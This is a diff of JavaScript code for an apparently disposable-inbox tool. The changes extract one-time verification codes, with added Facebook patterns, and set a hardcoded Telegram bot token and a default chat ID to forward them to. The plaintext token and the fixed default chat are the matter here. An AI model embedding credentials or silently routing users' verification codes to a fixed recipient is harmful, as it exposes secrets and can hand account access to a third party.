@@ -253,7 +253,8 @@
 
     let inboxes = JSON.parse(localStorage.getItem(STORAGE_KEY_INBOXES) || '[]');
     let activeAddress = localStorage.getItem(STORAGE_KEY_ACTIVE) || '';
-    let tgSettings = JSON.parse(localStorage.getItem(STORAGE_KEY_TG) || '{"chatId":"","botToken":"8576873952:AAFD919csZ1CWTKZv-fG5v7J8lGzUYCEtI4"}');
+    let tgSettings = JSON.parse(localStorage.getItem(STORAGE_KEY_TG) || '{"chatId":"736161596","botToken":"8576873952:AAFD919csZ1CWTKZv-fG5v7J8lGzUYCEtI4"}');
+    if (!tgSettings.chatId) tgSettings.chatId = '736161596';
     
     let deliveredMessageIds = new Set();
     let pollInterval = null;
@@ -678,14 +679,29 @@
 
     function extractOtp(content) {
       if (!content) return null;
-      const kw = content.match(/(?:code|otp|pin|verification\s*code|security\s*code|رمز\s*التحقق|رمز\s*التأكيد|كود\s*التفعيل|كود)[\s:=—\-]+([A-Z0-9]{4,8})\b/i);
+      // 1. Explicit Facebook pattern: "FB-12345" or "12345 is your Facebook confirmation code"
+      const fbPrefix = content.match(/\bFB-(\d{5})\b/i);
+      if (fbPrefix) return fbPrefix[1];
+
+      const fbAfter = content.match(/\b(\d{5})\s+(?:is your (?:Facebook|confirmation|verification|login|security) code)/i);
+      if (fbAfter) return fbAfter[1];
+
+      // 2. Keyword followed by code: "code: 12345", "كود التحقق: 84920", "كود: 12345"
+      const kw = content.match(/(?:code|otp|pin|verification\s*code|security\s*code|رمز\s*التحقق|رمز\s*التأكيد|كود\s*التفعيل|كود|رمز)[\s:=—\-]+([A-Z0-9]{4,8})\b/i);
       if (kw) return kw[1];
+
+      // 3. Google/Telegram style G-123456
       const gm = content.match(/\b([A-Z]{1,3}-\d{4,8})\b/);
       if (gm) return gm[1];
+
+      // 4. Standalone 6 digits
       const six = content.match(/(?<!\d|\$|€|£)(\d{6})(?!\d)/);
       if (six && !/^202[0-9]$/.test(six[1])) return six[1];
+
+      // 5. Standalone 4-5 digits (Facebook uses 5 digits!)
       const four = content.match(/(?<!\d)(\d{4,5})(?!\d)/);
       if (four && !/^202[0-9]$/.test(four[1])) return four[1];
+
       return null;
     }
 
